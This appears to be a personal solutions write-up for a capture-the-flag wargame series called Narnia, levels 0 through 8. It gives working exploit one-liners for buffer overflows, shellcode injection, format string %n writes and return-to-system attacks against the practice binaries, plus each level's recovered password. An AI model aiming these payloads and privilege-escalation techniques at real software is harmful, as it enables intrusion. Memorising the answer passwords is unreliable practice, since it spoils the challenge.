Solutions:
  
Level 0:
	- buf has 20*sizeof(char) memory allocated but scanf looks for 24 characters
	- so we exploit that overflow to change the value of val
	- cat; is used to make sure the program doesn't stop
	- run '(echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;) | ./narnia0'
	- password is found in /etc/narnia_pass/narnia1
	- Password: WDcYUTG5ul

Level 1: (Shellcode Injection through env)
	- the ./narnia1 program gets the value of $EGG env variable and executes it
	- this is provides an opportunity to inject some shellcode (it's assembly code written in hex)
	- since ./narnia1 runs with effective uid (euid) narnia2 we can exploit that
	- requirements:
		- we need to inject 'setreuid(geteuid(),geteuid())'
		- then either open a shell and run 'cat /etc/narnia_pass/narnia2'
		- or directly run 'cat /etc/narnia_pass/narnia2' to get the password (current shellcode uses this)
	- the assembly for the shellcode is in 'shell_code.asm'
	- convert to shellcode using 'https://defuse.ca/online-x86-assembler.htm'
	- now 'export EGG=$(printf "<shellcode>")'
	- run './narnia1' and there it is tHe PaSsWoRd
	- Password: 5agRAXeBdG

Level 2: (Shellcode Injection through strcpy() overflow)
	- ./narnia2 uses strcpy() to copy argv[1] to a buf of size 128
	- if we input a value of 132+4 then we can overwrite the return address with the +4 bytes
	- we make the return address be the address of the buf array
	- to get buf address:
		- use gdb and create a breakpoint at the strcpy() func_call
		- use 'x/2xw $esp' to get the address for buf (it is usually the second one)
		- to verify use 'x/136xb <buf_address>' and check if it aligns with the payload
	- now buf array will have a shellcode stored in it from our input and thus that shellcode will execute
	- we can use the previous shellcode with a few modifications like changing 'narnia2' to 'narnia3'
	- we will fill the payload with 0x90 (NOP) so that it reaches the required size
	- run './narnia2 $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90'*57+b'<shellcode>'+b'<buf_address (in little endian)>')")'
	- we may need to run it a few time with different buf_addresses (change few bits in LSB until it works)
	- Password: 2xszzNl6uG

Level 3:
	- like before ./narnia3 uses strcpy() to copy a filepath to ifile variable  of size 32
	- the strcpy causes an overflow an effects the ofile value of "/dev/null"
	- if we input a path with 33+x characters then ofile value is changed to whatever those x characters are
	- run 'mkdir -p $(python3 -c 'print ("/tmp/"+"A"*27+"/tmp")')'
	- run 'cd $(python3 -c 'print ("/tmp/"+"A"*27+"/tmp")')'
	- now create a symbolic link file named 'output' with '/etc/narnia_pass/narnia4'
	- make a file '/tmp/output' (make sure it is in the actual /tmp and not in the directory we created)
	- run 'chmod 777 /tmp/output'
	- run '/narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output'
	- this causes the ofile to be '/tmp/output'
	- now run 'cat /tmp/output' and we get the password
	- Password: iqNWNk173q 

Level 4:
	- similar to Level 2 we are trying to inject shellcode using strcpy()
	- ./narnia4 uses strcpy() to copy argv[1] to a buf of size 256
	- now instead of 132+4 overwrite we need to do a 264+4 overwrite
	- again we use the previous shellcode with modification of 'narnia3' to 'narnia5'
	- previously the buf_address was found through trial and error, this time we use a bash script to brute force it
	- copy-paste the bash code in 'narnia5_addr_brute.sh' and run it
	- after a few iteration the password will be available
	- Password: Ni3xHPEuuw

Level 5: (Format String Attack)
	- we need to change the value of i from 1 to 500
	- ./narnia5 uses snprintf to copy argv[1] to buffer
	- so we can't overflow it but we can perform a format string attack
	- in this attack we exploit the %s,%d,%x,etc.(format parameters) to either read/write to the memory
	- when we provide a value/address for the format parameters (as typically done) then that value/address is stored and read from stack
	- even if we don't provide one it will still read whatever is in the top of the stack
	- since in the program snprintf doesn't have a defined format string, we can define our own >:)
	- quick guide:
		- the pointed address is the bottom of the stack in the beginning
		- %{n}x prints the pointed address in stack and moves to the next element in stack (usually n is 08, higher values prints the same address with left padding)
		- %s prints the value in the pointed address of the stack
		- %n stores the length of string before it in the pointed address of stack
		- if we add 'AAAA' (0x41414141) to the start of our format string then that value will be in the top of the stack. (due to how format strings work)
		- we could replace that 'AAAA' with an address (in little endian(LE)) in the program. this will allow us to read the value using %s or write in it using %n
	- to get the <addr_i>, we simply run the program with any arguement and the output will have it
	- run './narnia5 $(python3 -c "import sys;sys.stdout.buffer.write(b'\x41\x41\x41\x41<addr_i (in LE)>%492x%n')")' (the 'AAAA' is to account for shift due to %x)
	- now with the shell open, run 'cat /etc/narnia_pass/narnia6'
	- Password: BNSjoSDeGL

Level 6:
	- in ./narnia6 we again take advantage of buffer overflow from strcpy()
	- all the argv[x] where x>=3 are reset/cleared
	- argv[1] and argv[2] are strcpy()'d to b1 and b2 respectively (both of size 8)
	- with b1, we overflow it in such a way that the return address is the address of system() call
	- this causes system() to be called and at the top of the stack the value will be whatever value was copied from argv[1]
	- so if we make '/bin/sh;' the first part of argv[1], the shell will open and we can simply cat the password out
	- run './narnia6 $(python3 -c "import sys;sys.stdout.buffer.write(b'/bin/sh;'+b'\x30\xd4\xdc\xf7')") BBBB'
	- run 'cat /etc/narnia_pass/narnia7'
	- Password: 54RtepCEU0

Level 7:
	- like Level 5 we have to perform a format string attack with snprintf
	- in vuln() function, ptrf is assigned to the goodfunction(). we want to try reassign it to hackedfunction()
	- by running './narnia7 <any_val>' we can find the address of both the functions as well as ptrf in the output
	- convert the address of hackedfunction() to decimal
	- now we need to write that address to ptrf
	- run './narnia7 $(python3 -c "import sys;sys.stdout.buffer.write(b'<addr_ptrf>%<addr_hackfunction() (in decimal)-4>x%n')")' (-4 is to account for <addr_ptrf>'s len)
	- run 'cat /etc/narnia_pass/narnia8'
	- Password: i1SQ81fkb8

Level 8:
	- in ./narnia8 values from blah(which is a pointer to argv[1]) are copied into bok in func()
	- gdb analysis:
		- run it with 24*'A' then checking the $esp we can for every for loop iteration we can see that the 'A's are filled
		- after the 20th 'A' the next 'A' allows the for loop to terminate
		- this is because that 'A' changes the address that is referenced when copying the value (which usually references '0x00')
		- what we need to do is maintain that return address to be the same as the address of blah
		- now run it with 20*'A'+<addr_blah>+4*'B'+4*'C'
		- now it changes the return address to '0x43434343'
		- so we need to change the return address to an address which will contain our shellcode 
		- this address with the shellcode will be at <addr_blah+32> (accounting for the previous characters)
	- this time the shellcode will setreuid(geteuid,geteuid) and runs /bin/sh
	- we need to execute with 20*'A'+<addr_blah>+4*'B'+<addr_blah+32>+<shellcode>
	- the address for blah can vary so we copy-paste 'narnia8_addr_brute.sh' and run it
	- after a few iterations the privileged shell will start
	- run 'cat /etc/narnia_pass/narnia9'
	- Password: 1FFD4HnU4K

COMPLETED!!
